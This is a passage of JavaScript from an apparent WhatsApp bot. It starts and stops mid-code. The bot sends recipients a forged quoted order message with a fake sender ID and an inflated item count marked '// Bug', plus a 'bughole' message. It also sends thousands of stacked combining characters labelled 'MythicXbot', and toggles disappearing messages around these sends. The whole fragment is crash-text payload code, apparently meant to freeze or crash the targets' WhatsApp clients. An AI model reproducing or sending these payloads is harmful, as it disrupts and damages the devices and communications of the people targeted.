̯̱̪͍͉̟̈́́͒͟⁤̸̛̯̠͔̟̿̿̀̊̒́̀̌̂̔̍̓͡',
                        jpegThumbnail: bro },location,{
 quoted: {
  key: {
   participant: '111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
     message: 'ʀᴀɴᴢ̷',
    orderTitle: 'fake', // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})

await kurzxd.toggleDisappearingMessages(from,`MODAR`,text)
kurzxd.sendMessage(from, bughole(prefix), text)
await kurzxd.toggleDisappearingMessages(from,`MODAR`,text)
kurzxd.sendMessage(from, `ஓঔ🛡⇝͜͡✪𝕷𝖔𝖗𝖉\x20𝕬𝖗𝖎𝖋𝖎🦅\x20͜͡✪*\x0a*~*.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.*999**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭999999**ผิดุท้่เึางืผิดุท้่เึางื**9999999**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭৭৭৭৭৭*MythicXbot*๒๒๒๒๒๒๒๒*MythicXbot*৭৭৭৭৭৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈